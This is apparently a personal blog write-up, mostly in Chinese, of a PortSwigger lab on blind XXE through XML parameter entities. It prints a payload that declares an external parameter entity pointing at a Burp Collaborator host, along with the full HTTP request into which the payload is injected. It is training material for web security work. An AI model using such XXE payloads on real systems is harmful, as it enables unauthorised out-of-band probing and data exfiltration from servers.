---
layout: post
title: "Blind XXE with out-of-band interaction via XML parameter entities"
description: ""
date: 2023-07-11
categories:
  - PortSwigger_Lab
  - PortSwigger_XXE
author: ""
tags: ['PortSwigger_Lab', 'XXE']
---





# Blind XXE with out-of-band interaction via XML parameter entities


參數實體百分號(%):
https://www.cnblogs.com/backlion/p/9302528.html


```
This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.

To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.
Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.



此實驗室具有“檢查庫存”功能，可解析 XML 輸入，但不顯示任何意外值，並阻止包含常規外部實體的請求。

為了解決實驗室問題，使用參數實體使 XML 解析器向 Burp Collaborator 發出 DNS 查找和 HTTP 請求。
筆記

為了防止 Academy 平台被用於攻擊第三方，我們的防火牆阻止了實驗室與任意外部系統之間的交互。 要解決實驗室，您必須使用 Burp Collaborator 的默認公共服務器。





```


這題跟OOB前面一樣。



burp collaborator :
```
1prf8m2crzdgc7kleq8nd6ygi7oycn.burpcollaborator.net
```


官方payload:
```xml
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>

//第一次定義變數，%代表只能在實體中使用。
% xxe  


//第二次放在後面，則是使用便數。
% xxe

```




只是注入使用了 參數實體百分號

簡單來說變數被宣告在實體 使用也在實體 ，而不是在xml 裡面。


BP
```http

POST /product/stock HTTP/1.1
Host: 0a1b00fa04279a9dc083400f008c00fc.web-security-academy.net
Cookie: session=C26byVZfE624ub6wgHd7wmAZ9Tk5BeGu
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: https://0a1b00fa04279a9dc083400f008c00fc.web-security-academy.net/product?productId=3
Content-Type: application/xml
Content-Length: 107
Origin: https://0a1b00fa04279a9dc083400f008c00fc.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

<?xml version="1.0" encoding="UTF-8"?>

<stockcheck>
	<productid>3</productid>
	<storeid>1</storeid>
</stockcheck>

```


修改:
```http


POST /product/stock HTTP/1.1
Host: 0a1b00fa04279a9dc083400f008c00fc.web-security-academy.net
Cookie: session=C26byVZfE624ub6wgHd7wmAZ9Tk5BeGu
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: https://0a1b00fa04279a9dc083400f008c00fc.web-security-academy.net/product?productId=3
Content-Type: application/xml
Content-Length: 107
Origin: https://0a1b00fa04279a9dc083400f008c00fc.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

<?xml version="1.0" encoding="UTF-8"?>


<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://1prf8m2crzdgc7kleq8nd6ygi7oycn.burpcollaborator.net"> %xxe; ]>

<stockcheck>
	<productid>3</productid>
	<storeid>1</storeid>
</stockcheck>





```



成功